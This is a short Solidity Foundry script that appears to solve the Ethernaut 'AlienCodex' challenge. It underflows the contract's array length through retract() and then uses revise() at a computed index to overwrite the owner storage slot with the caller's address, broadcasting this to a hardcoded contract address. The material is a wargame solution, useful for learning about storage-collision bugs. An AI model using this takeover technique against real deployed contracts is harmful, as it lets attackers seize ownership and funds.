/// SPDX-License-Identifier: MIT
pragma solidity ^0.6.2;

import "forge-std/Script.sol";

interface IAlienCodex {
    function makeContact() external;

    function record(bytes32 _content) external;

    function retract() external;

    function revise(uint256 i, bytes32 _content) external;

    function owner() external view returns (address);
}

contract AlienCodex is Script {
    function run() public {
        vm.startBroadcast();

        IAlienCodex alienCodex = IAlienCodex(
            0x6c3c269650d974e2CDA15F3e3bbDd018bF1e553c
        );
        alienCodex.makeContact();
        alienCodex.retract();

        uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
        alienCodex.revise(index, bytes32(uint256(msg.sender)));

        vm.stopBroadcast();
    }
}
